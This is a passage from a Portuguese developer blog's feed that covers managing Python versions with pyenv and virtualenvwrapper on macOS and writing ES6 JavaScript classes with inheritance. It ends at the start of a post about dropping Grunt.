&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ pyenv install &lt;span class="m"&gt;3&lt;/span&gt;.5.1
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Genial, não?&lt;/p&gt;
&lt;h2&gt;Transitando entre versões&lt;/h2&gt;
&lt;p&gt;Para utilizar a versão instalada no terminal que está aberto, usamos o parâmetro &lt;code&gt;shell&lt;/code&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ pyenv shell &lt;span class="m"&gt;3&lt;/span&gt;.5.1
$ python -V
Python &lt;span class="m"&gt;3&lt;/span&gt;.5.1
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Talvez seja necessário executar o comando &lt;code&gt;pyenv rehash&lt;/code&gt;, caso você não esteja
obtendo o resultado esperado.&lt;/p&gt;
&lt;p&gt;Com o comando &lt;code&gt;versions&lt;/code&gt; obtemos as versões disponíveis no computador:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ pyenv versions
system
* &lt;span class="m"&gt;3&lt;/span&gt;.5.1 &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;set&lt;/span&gt; by PYENV_VERSION environment variable&lt;span class="o"&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;O asterisco indica a versão em uso atualmente.&lt;/p&gt;
&lt;p&gt;Com o comando &lt;code&gt;local&lt;/code&gt;, setamos uma determinada versão do &lt;em&gt;Python&lt;/em&gt; para um
determinado &lt;em&gt;path&lt;/em&gt;. Exemplo:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ &lt;span class="nb"&gt;cd&lt;/span&gt; ~/Workspace/blog
$ pyenv &lt;span class="nb"&gt;local&lt;/span&gt; &lt;span class="m"&gt;3&lt;/span&gt;.5.1
$ pyenv version
&lt;span class="m"&gt;3&lt;/span&gt;.5.1 &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;set&lt;/span&gt; by /Users/klaus/Workspace/blog/.python-version&lt;span class="o"&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;O &lt;em&gt;Pyenv&lt;/em&gt; criará um arquivo &lt;code&gt;.python-version&lt;/code&gt; no diretório, e
todo o momento que você acessá-lo trocará a versão corrente do
interpretador, automaticamente.&lt;/p&gt;
&lt;p&gt;&lt;img class="align-center" src="/images/blog/sparrow.jpg" width="610" height="293" title="Minha cara após o update do El Capitan (thewrap.com)" alt="Minha cara após o update do El Capitan (thewrap.com)"&gt;&lt;/p&gt;
&lt;p&gt;Um &lt;em&gt;workaround&lt;/em&gt; para fazer o meu ambiente de trabalho funcionar,
no &lt;em&gt;El Capitan&lt;/em&gt;, foi baixar uma versão 2.7.x do &lt;em&gt;Python&lt;/em&gt; e torná-la
&lt;code&gt;global&lt;/code&gt;. Exemplo:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ pyenv install &lt;span class="m"&gt;2&lt;/span&gt;.7.10
$ pyenv rehash
$ pyenv global &lt;span class="m"&gt;2&lt;/span&gt;.7.10
system
* &lt;span class="m"&gt;2&lt;/span&gt;.7.10 &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;set&lt;/span&gt; by /usr/local/opt/pyenv/version&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="m"&gt;3&lt;/span&gt;.5.1
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Com isso, o comando &lt;code&gt;pip&lt;/code&gt; voltou a funcionar "system wide", bem como
as minhas integrações do &lt;code&gt;zsh&lt;/code&gt; com o &lt;code&gt;virtualenvwrapper&lt;/code&gt;.&lt;/p&gt;
&lt;h2&gt;Bônus: virtualenvwrapper&lt;/h2&gt;
&lt;p&gt;E assim a minha vida continuou pacata e serena... até o momento que eu
tiver que criar um &lt;code&gt;virtualenv&lt;/code&gt; para uma versão diferente da minha
versão &lt;code&gt;global&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;O &lt;em&gt;Pyenv&lt;/em&gt; com &lt;em&gt;virtualenvwrapper&lt;/em&gt; não se entendem muito bem.
Para facilitar a nossa vida, temos o &lt;a href="https://github.com/yyuu/pyenv-virtualenvwrapper" title="Veja o repositório no GitHub"&gt;&lt;em&gt;pyenv-virtualenvwrapper&lt;/em&gt;&lt;/a&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ pip install virtualenvwrapper
$ brew install pyenv-virtualenvwrapper
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;É necessário ativá-lo em seu &lt;em&gt;shell&lt;/em&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ pyenv virtualenvwrapper
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;E agora sim, criar o seu ambiente virtual:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ pyenv shell &lt;span class="m"&gt;3&lt;/span&gt;.5.1
$ mkvirtualenv &lt;span class="nb"&gt;test&lt;/span&gt;
Using base prefix &lt;span class="s1"&gt;&amp;#39;/usr/local/opt/pyenv/versions/3.5.1&amp;#39;&lt;/span&gt;
New python executable in /Users/klaus/.virtualenvs/test/bin/python3.5
Also creating executable in /Users/klaus/.virtualenvs/test/bin/python
Installing setuptools, pip, wheel...done.
virtualenvwrapper.user_scripts creating /Users/klaus/.virtualenvs/test/bin/predeactivate
virtualenvwrapper.user_scripts creating /Users/klaus/.virtualenvs/test/bin/postdeactivate
virtualenvwrapper.user_scripts creating /Users/klaus/.virtualenvs/test/bin/preactivate
virtualenvwrapper.user_scripts creating /Users/klaus/.virtualenvs/test/bin/postactivate
virtualenvwrapper.user_scripts creating /Users/klaus/.virtualenvs/test/bin/get_env_details
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;E "esquecer" do comando &lt;code&gt;pyenv&lt;/code&gt; a partir do momento que você tem os seus &lt;em&gt;virtualenvs&lt;/em&gt; criados:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ workon meu_projeto_em_py_27
$ python -V
Python &lt;span class="m"&gt;2&lt;/span&gt;.7.10

$ workon &lt;span class="nb"&gt;test&lt;/span&gt;
$ python -V
Python &lt;span class="m"&gt;3&lt;/span&gt;.5.1
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Considerações finais&lt;/h2&gt;
&lt;p&gt;O &lt;em&gt;Pyenv&lt;/em&gt; é, assim como o &lt;em&gt;virtualenv&lt;/em&gt;, aquele tipo de ferramenta que te mantém são e salvo
quando a sua necessidade é trabalhar com versões completamente diferentes do &lt;em&gt;Python&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;Infelizmente, o seu uso com o &lt;em&gt;virtualenvwrapper&lt;/em&gt; não é lá tão &lt;em&gt;smooth&lt;/em&gt; (mas está longe de
ser complicado). Para facilitar a vida, talvez adicionar o comando &lt;code&gt;pyenv virtualenvwrapper&lt;/code&gt;
ao seu &lt;code&gt;.bash_profile&lt;/code&gt; ou &lt;code&gt;.zshrc&lt;/code&gt; seja uma dica interessante.&lt;/p&gt;
&lt;p&gt;Ou ainda, você pode utilizar o &lt;em&gt;virtualenvwrapper&lt;/em&gt; para os
projetos &lt;em&gt;Python&lt;/em&gt; 2.7.x, e o &lt;a href="https://docs.python.org/3/library/venv.html" title="Creation of virtual environments in Python 3"&gt;&lt;em&gt;pyvenv&lt;/em&gt;&lt;/a&gt;
para projetos &amp;gt; 3.2.&lt;/p&gt;
&lt;p&gt;Até a próxima.&lt;/p&gt;
&lt;h2&gt;Referências&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/yyuu/pyenv"&gt;&lt;em&gt;Pyenv - Simple Python version management&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/yyuu/pyenv-virtualenvwrapper"&gt;&lt;em&gt;Pyenv-virtualenvwrapper - An alternative approach to manage virtualenvs from pyenv&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://blog.shichao.io/2014/10/01/setup_virtualenvwrapper_with_pyenv_using_pyenv_virtualenvwrapper.html"&gt;&lt;em&gt;Schichao's Blog - Setting up virtualenvwrapper with pyenv using pyenv-virtualenvwrapper&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://taoofmac.com/space/blog/2015/10/03/1245"&gt;&lt;em&gt;The Tao of Mac - Using Pyenv with El Capitan&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</content><category term="desenvolvimento"></category><category term="python"></category><category term="pyenv"></category><category term="virtualenv"></category><category term="virtualenvwrapper"></category><category term="macosx"></category></entry><entry><title>Fazendo Javascript OO de forma fácil - Parte 2</title><link href="https://klauslaube.com.br/2016/03/15/fazendo-javascript-oo-de-forma-facil-parte-2.html" rel="alternate"></link><published>2016-03-15T13:20:00-03:00</published><updated>2016-03-15T13:20:00-03:00</updated><author><name>Klaus Peter Laube</name></author><id>tag:klauslaube.com.br,2016-03-15:/2016/03/15/fazendo-javascript-oo-de-forma-facil-parte-2.html</id><summary type="html">&lt;p&gt;Há cerca de 5 anos, fiz um &lt;em&gt;post&lt;/em&gt; sobre como escrever
&lt;a href="https://klauslaube.com.br/2011/05/16/fazendo-javascript-oo-de-forma-facil.html" title="Leia o artigo completo"&gt;Javascript OO de forma fácil&lt;/a&gt;
utilizando a orientação a objetos da linguagem através de
&lt;a href="https://klauslaube.com.br/2011/10/23/javascript-constructor-function-object-literal.html" title="Diferença entre Constructor Function e Object Literal"&gt;&lt;em&gt;Constructor Functions&lt;/em&gt; e &lt;em&gt;Object Literal&lt;/em&gt;&lt;/a&gt;.
Hoje, com o &lt;em&gt;ES6&lt;/em&gt;, o esquema de &lt;em&gt;Prototype&lt;/em&gt; ainda continua,
mas a sintaxe ficou muito mais fácil e intuitiva, valendo …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Há cerca de 5 anos, fiz um &lt;em&gt;post&lt;/em&gt; sobre como escrever
&lt;a href="https://klauslaube.com.br/2011/05/16/fazendo-javascript-oo-de-forma-facil.html" title="Leia o artigo completo"&gt;Javascript OO de forma fácil&lt;/a&gt;
utilizando a orientação a objetos da linguagem através de
&lt;a href="https://klauslaube.com.br/2011/10/23/javascript-constructor-function-object-literal.html" title="Diferença entre Constructor Function e Object Literal"&gt;&lt;em&gt;Constructor Functions&lt;/em&gt; e &lt;em&gt;Object Literal&lt;/em&gt;&lt;/a&gt;.
Hoje, com o &lt;em&gt;ES6&lt;/em&gt;, o esquema de &lt;em&gt;Prototype&lt;/em&gt; ainda continua,
mas a sintaxe ficou muito mais fácil e intuitiva, valendo a pena dar um &lt;em&gt;revival&lt;/em&gt;
no tema para explorar um pouquinho mais das novas funcionalidades.&lt;/p&gt;
&lt;!-- PELICAN_END_SUMMARY --&gt;

&lt;p&gt;Então, nobre leitor, prepare o seu &lt;a href="https://babeljs.io/" title="Javascript compiler"&gt;&lt;em&gt;Babel&lt;/em&gt;&lt;/a&gt; e vamos escrever algumas classes
na nova sintaxe do &lt;a href="https://klauslaube.com.br/tag/javascript.html" title="Leia mais sobre Javascript"&gt;&lt;em&gt;Javascript&lt;/em&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;h2&gt;Açúcares sintáticos&lt;/h2&gt;
&lt;p&gt;Sim! A sintaxe apresentada no &lt;em&gt;ECMAScript 6&lt;/em&gt; não passa de açúcar sintático!&lt;/p&gt;
&lt;p&gt;Na prática, o &lt;em&gt;Javascript&lt;/em&gt; continua utilizando a orientação a objetos através de
&lt;em&gt;Prototype&lt;/em&gt;. Mas isso não diminui em nada o valor desse &lt;em&gt;approach&lt;/em&gt; para com a
linguagem. Fazer &lt;em&gt;Javascript&lt;/em&gt; OOP é a realidade de muitas aplicações
(complexas ou não), e caso você queira escrever componentes utilizando &lt;em&gt;React&lt;/em&gt;,
verá que a dupla &lt;em&gt;ES6&lt;/em&gt; + &lt;em&gt;React&lt;/em&gt; é capaz de produzir componentes com código
extremamente legível e elegante.&lt;/p&gt;
&lt;p&gt;Vamos começar escrevendo nossa classe &lt;code&gt;Pessoa&lt;/code&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kr"&gt;class&lt;/span&gt; &lt;span class="nx"&gt;Pessoa&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
  &lt;span class="nx"&gt;constructor&lt;/span&gt;&lt;span class="p"&gt;({&lt;/span&gt;&lt;span class="nx"&gt;nome&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;idade&lt;/span&gt;&lt;span class="p"&gt;})&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="k"&gt;this&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;nome&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;nome&lt;/span&gt;
    &lt;span class="k"&gt;this&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;idade&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;idade&lt;/span&gt;
  &lt;span class="p"&gt;}&lt;/span&gt;

  &lt;span class="nx"&gt;sayTheName&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="nx"&gt;console&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;log&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="k"&gt;this&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;nome&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
  &lt;span class="p"&gt;}&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;

&lt;span class="kd"&gt;let&lt;/span&gt; &lt;span class="nx"&gt;pessoa&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="nx"&gt;Pessoa&lt;/span&gt;&lt;span class="p"&gt;({&lt;/span&gt;&lt;span class="nx"&gt;idade&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;18&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;nome&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Guido&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;});&lt;/span&gt;
&lt;span class="nx"&gt;pessoa&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;sayTheName&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt; &lt;span class="c1"&gt;// Guido&lt;/span&gt;
&lt;span class="nx"&gt;console&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;log&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;pessoa&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;__proto__&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;sayTheName&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt; &lt;span class="c1"&gt;// function sayTheName&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Agora possuímos a palavra reservada &lt;code&gt;class&lt;/code&gt; para a construção de classes. Além
disso, temos a inserção do método &lt;code&gt;constructor&lt;/code&gt;, que será executado no momento em que
a instância for criada.&lt;/p&gt;
&lt;p&gt;Não precisamos mais da assinatura &lt;code&gt;Pessoa.prototype.method = function&lt;/code&gt;
para adicionarmos um método. Agora há uma sintaxe específica, muito mais clara
e fácil de lembrar.&lt;/p&gt;
&lt;p&gt;&lt;img class="align-center" src="/images/blog/stay-classy.jpeg" width="600" height="345" title="Stay classy San Diego! (sandiegouniontribune.com)" alt="Stay classy San Diego! (sandiegouniontribune.com)"&gt;&lt;/p&gt;
&lt;p&gt;Note que no momento de instanciar a classe, nada muda em relação à versão atual.
O que temos de mais "exótico" é a capacidade de nomearmos parâmetros
(como os &lt;code&gt;**kwargs&lt;/code&gt; do &lt;a href="https://klauslaube.com.br/tag/python.html" title="Leia mais sobre Python"&gt;&lt;em&gt;Python&lt;/em&gt;&lt;/a&gt;),
na definição do construtor.&lt;/p&gt;
&lt;p&gt;Esse conceito, apresentado na linha &lt;code&gt;constructor({nome, idade})&lt;/code&gt;, é chamado de
&lt;a href="https://github.com/lukehoban/es6features#destructuring"&gt;&lt;em&gt;destructuring&lt;/em&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Para chegarmos a um resultado parecido no &lt;em&gt;ES5&lt;/em&gt;, precisaríamos fazer o seguinte:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kd"&gt;var&lt;/span&gt; &lt;span class="nx"&gt;Pessoa&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="kd"&gt;function&lt;/span&gt; &lt;span class="nx"&gt;Pessoa&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;options&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
  &lt;span class="kd"&gt;var&lt;/span&gt; &lt;span class="nx"&gt;nome&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;options&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;nome&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
  &lt;span class="kd"&gt;var&lt;/span&gt; &lt;span class="nx"&gt;idade&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;options&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;idade&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

  &lt;span class="k"&gt;this&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;nome&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;nome&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
  &lt;span class="k"&gt;this&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;idade&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;idade&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;};&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Herança&lt;/h2&gt;
&lt;p&gt;Lembra da confusão que era fazer heranças no &lt;em&gt;Javascript&lt;/em&gt;? Pois bem, ganhamos
nessa nova versão da linguagem a palavra reservada &lt;code&gt;extends&lt;/code&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kr"&gt;class&lt;/span&gt; &lt;span class="nx"&gt;Atleta&lt;/span&gt; &lt;span class="kr"&gt;extends&lt;/span&gt; &lt;span class="nx"&gt;Pessoa&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
  &lt;span class="nx"&gt;constructor&lt;/span&gt;&lt;span class="p"&gt;({&lt;/span&gt;&lt;span class="nx"&gt;nome&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;idade&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;esporte&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Basquete&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;})&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="kr"&gt;super&lt;/span&gt;&lt;span class="p"&gt;({&lt;/span&gt;&lt;span class="nx"&gt;nome&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="nx"&gt;nome&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;idade&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="nx"&gt;idade&lt;/span&gt;&lt;span class="p"&gt;})&lt;/span&gt;

    &lt;span class="k"&gt;this&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;esporte&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;esporte&lt;/span&gt;
  &lt;span class="p"&gt;}&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;

&lt;span class="kd"&gt;let&lt;/span&gt; &lt;span class="nx"&gt;jogador&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="nx"&gt;Atleta&lt;/span&gt;&lt;span class="p"&gt;({&lt;/span&gt;&lt;span class="nx"&gt;idade&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="mi"&gt;22&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;nome&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;Fulano&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;esporte&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;Futebol&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;})&lt;/span&gt;
&lt;span class="nx"&gt;console&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;log&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;jogador&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;nome&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt; &lt;span class="c1"&gt;// Fulano&lt;/span&gt;
&lt;span class="nx"&gt;console&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;log&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;jogador&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;esporte&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt; &lt;span class="c1"&gt;// Futebol&lt;/span&gt;

&lt;span class="kd"&gt;let&lt;/span&gt; &lt;span class="nx"&gt;jogador2&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="nx"&gt;Atleta&lt;/span&gt;&lt;span class="p"&gt;({&lt;/span&gt;&lt;span class="nx"&gt;idade&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="mi"&gt;28&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;nome&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;Beltrano&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;});&lt;/span&gt;
&lt;span class="nx"&gt;console&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;log&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;jogador2&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;nome&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt; &lt;span class="c1"&gt;// Beltrano&lt;/span&gt;
&lt;span class="nx"&gt;console&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;log&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;jogador2&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;esporte&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt; &lt;span class="c1"&gt;// Basquete&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;E para tornar ainda mais fácil essa prática, também ganhamos a função reservada
&lt;code&gt;super&lt;/code&gt;, que é responsável por executar o método pai, dada a chamada em um
determinado método de uma classe filha.&lt;/p&gt;
&lt;p&gt;Para finalizar o nosso exemplo, na linha &lt;code&gt;constructor({nome, idade, esporte='Basquete'})&lt;/code&gt;
temos a apresentação do recurso &lt;a href="https://github.com/lukehoban/es6features#default--rest--spread" title="Leia mais sobre default, rest e spread"&gt;&lt;em&gt;default&lt;/em&gt;&lt;/a&gt;.
Com ele, somos capazes de definir valores padrões caso a passagem de determinado
parâmetro seja omitida.&lt;/p&gt;
&lt;h2&gt;Considerações finais&lt;/h2&gt;
&lt;p&gt;Se tem algo que chama a atenção com o advento do &lt;em&gt;ECMAScript 6&lt;/em&gt; é a facilidade
na construção de classes e objetos, uma coisa que sempre foi muito confusa
(mas não menos eficiente) em &lt;em&gt;Javascript&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;Bibliotecas como o &lt;em&gt;React&lt;/em&gt; tem feito um bom uso desse recurso, proporcionando
soluções limpas e legíveis, fáceis de estender e customizar.&lt;/p&gt;
&lt;p&gt;O suporte pelos &lt;em&gt;browsers&lt;/em&gt; ainda não é dos melhores, se fazendo necessário
o uso do &lt;em&gt;Babel&lt;/em&gt; para o &lt;em&gt;transpiling&lt;/em&gt; de &lt;em&gt;ES6&lt;/em&gt; para &lt;em&gt;ES5&lt;/em&gt;. Mesmo assim, nada
que impeça o uso de sintaxe &lt;em&gt;ES6&lt;/em&gt; nos seus próximos projetos.&lt;/p&gt;
&lt;p&gt;Confira a &lt;a href="https://babeljs.io/repl/#?evaluate=true&amp;amp;presets=es2015%2Cstage-2&amp;amp;code=class%20Pessoa%20%7B%0A%20%20constructor(%7Bnome%2C%20idade%7D)%20%7B%0A%20%20%20%20this.nome%20%3D%20nome%0A%20%20%20%20this.idade%20%3D%20idade%0A%20%20%7D%0A%20%20%0A%20%20sayTheName()%20%7B%0A%20%20%20%20console.log(this.nome)%3B%0A%20%20%7D%0A%7D%0A%0Alet%20pessoa%20%3D%20new%20Pessoa(%7Bidade%3A18%2C%20nome%3A'Guido'%7D)%3B%0Apessoa.sayTheName()%3B%20%2F%2F%20Guido%0Aconsole.log(pessoa.__proto__.sayTheName)%3B%20%2F%2F%20function%20sayTheName%0A%0Aclass%20Atleta%20extends%20Pessoa%20%7B%0A%20%20constructor(%7Bnome%2C%20idade%2C%20esporte%3D%22Basquete%22%7D)%20%7B%0A%20%20%20%20super(%7Bnome%2C%20idade%7D)%0A%0A%20%20%20%20this.esporte%20%3D%20esporte%0A%20%20%7D%0A%7D%0A%0Alet%20jogador%20%3D%20new%20Atleta(%7Bidade%3A%2022%2C%20nome%3A'Fulano'%2C%20esporte%3A'Futebol'%7D)%0Aconsole.log(jogador.nome)%3B%20%2F%2F%20Fulano%0Aconsole.log(jogador.esporte)%3B%20%2F%2F%20Futebol%0A%0Alet%20jogador2%20%3D%20new%20Atleta(%7Bidade%3A%2028%2C%20nome%3A%20'Beltrano'%7D)%3B%0Aconsole.log(jogador2.nome)%3B%20%2F%2F%20Beltrano%0Aconsole.log(jogador2.esporte)%3B%20%2F%2F%20Basquete" title="Veja o código transpilado no Babel"&gt;versão "transpilada" no &lt;em&gt;Babel&lt;/em&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Até a próxima!&lt;/p&gt;
&lt;h2&gt;Referências&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://www.2ality.com/2015/08/getting-started-es6.html"&gt;&lt;em&gt;2ality - Getting started with ECMAScript 6&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/lukehoban/es6features"&gt;&lt;em&gt;lukehoban - Overview of ECMAScript 6 features&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</content><category term="desenvolvimento"></category><category term="web"></category><category term="javascript"></category><category term="es6"></category><category term="oop"></category></entry><entry><title>Vivendo sem o Grunt</title><link href="https://klauslaube.com.br/2016/02/22/vivendo-sem-o-grunt.html" rel="alternate"></link><published>2016-02-22T12:35:00-03:00</published><updated>2016-02-22T12:35:00-03:00</updated><author><name>Klaus Peter Laube</name></author><id>tag:klauslaube.com.br,2016-02-22:/2016/02/22/vivendo-sem-o-grunt.html</id><summary type="html">&lt;p&gt;No meu primeiro contato com o &lt;em&gt;Grunt&lt;/em&gt;, ele não me convenceu. Qual era a
necessidade de um &lt;em&gt;task runner&lt;/em&gt; se eu já tinha o &lt;code&gt;Makefile&lt;/code&gt;? O mesmo valia
